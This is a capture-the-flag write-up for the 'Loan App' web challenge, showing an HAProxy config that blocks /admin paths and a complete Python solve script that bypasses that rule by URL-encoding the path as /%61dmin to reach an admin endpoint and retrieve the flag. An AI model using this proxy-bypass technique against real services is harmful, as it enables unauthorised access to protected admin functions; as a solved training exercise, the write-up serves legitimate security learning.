+++
title = 'Loan App'
tags = [
  "Web",
  "Python",
  "Proxy bypass",
  "394 points",
  "129 solves",
  "Vigneswar",
]
date = 2024-10-06T14:41:13+02:00
draft = true
+++

<h1 style='text-decoration: underline;text-decoration-color: #9e8c6c;font-size: 3em;'>Loan app</h1>

**Description**: One of the first web challenges solved in ctf, not very complex (at least the unintended solution)

## Introduction

This is the challenge web with the most solutions, which I must say is very nice, my solution is the unintended but also the most common one, in fact the correct approach would have been to do 'request smuggling', which is a much more complex attack to bypass the proxy, which in this case consists of splitting a request between proxy and backend.

Solve intended: [Something like this](https://grenfeldt.dev/2021/04/01/gunicorn-20.0.4-request-smuggling/)

## Source

We focus on the proxy config

```python
# filename: file.py

global
    log stdout format raw local0
    maxconn 2000
    user root
    group root
    daemon

defaults
    log global
    option httplog
    timeout client 30s
    timeout server 30s
    timeout connect 30s

frontend http_front
    mode http
    bind :80
    acl is_admin path_beg /admin # Miss config
    http-request deny if is_admin # Miss config
    default_backend gunicorn

backend gunicorn
    mode http
    balance roundrobin
    server loanserver loanapp:8000 maxconn 32

```

And win function

```python
# filename: file.py

@app.route('/admin/loan/<loan_id>', methods=['POST'])
def admin_approve_loan(loan_id):
    try:
        mongo.db.loan.update_one({'_id': ObjectId(loan_id)}, {'$set': {'status': 'approved', 'message': FLAG}})
        return 'OK', 200
    except:
        return 'Internal Server Error', 500

```

_Comments added by me_

## Solution

The solution is very simple: just read the source code, register and login, and create a loan. Once this is done, thanks to the `/admin/loan/id` endpoint, the loan is approved by setting the flag

```python
# filename: file.py

#!/usr/bin/python3

import http
import requests
from uuid import uuid4
from bs4 import BeautifulSoup
import urllib3.util

BASE_URL = "http://loanapp.1nf1n1ty.team/"
s = requests.Session()

def login(username,password):
  r = s.post(BASE_URL + "login", data={"username": username, "password": password})
  if r.status_code == 200:
    print("[+] Login successful")
  else:
    print("[-] Login failed: " + r.text)
    exit(1)

def register(username,password):
  r = s.post(BASE_URL + "register",data={"username": username, "password": password})
  if r.status_code == 200:
    print("[+] Registration successful")
  else:
    print("[-] Registration failed: " + r.text)
    exit(1)


def loan_request():
  r = s.post(BASE_URL + "loan-request", data={"amount": "696969696969696969", "reason": "I need money for cookies"})
  if r.status_code == 200:
    print("[+] Loan request successful")
  else:
    print("[-] Loan request failed: " + r.text)
    exit(1)

def get_loan_id():
  r = s.get(BASE_URL)
  soup = BeautifulSoup(r.text, 'html.parser')
  loan_id = soup.find("span", attrs={"class":"loan-id"}).text.strip().split(": ")[1]
  return loan_id

def exploit(loan_id):
  conn = http.client.HTTPConnection(urllib3.util.parse_url(BASE_URL).host)
  conn.request("POST", f"/%61dmin/loan/{loan_id}") # Use http instead of requests for avoid auto url encoding of requests
  response = conn.getresponse()
  if response.status != 200:
    print("[-] Exploit failed")
    exit(1)

def get_flag():
  r = s.get(BASE_URL)
  soup = BeautifulSoup(r.text, 'html.parser')
  return soup.find("p", attrs={"class": "loan-message"}).text.strip()[7:]

def main():
  username, password = uuid4(), uuid4()
  print(f"Username: {username} Password: {password}")
  register(username,password)
  login(username,password)
  loan_request()
  loan_id = get_loan_id()
  print(f"[+] Loan ID: {loan_id}")
  exploit(loan_id)
  print(f"[+] Flag: {get_flag()}")


if __name__ == "__main__":
  main()

# goodluck by @akiidjk

```

```stdout
$flag: ironCTF{L04n_4ppr0v3d_f0r_H4ck3r$!!}
```

<p align='right'>Author: akiidjk </p>
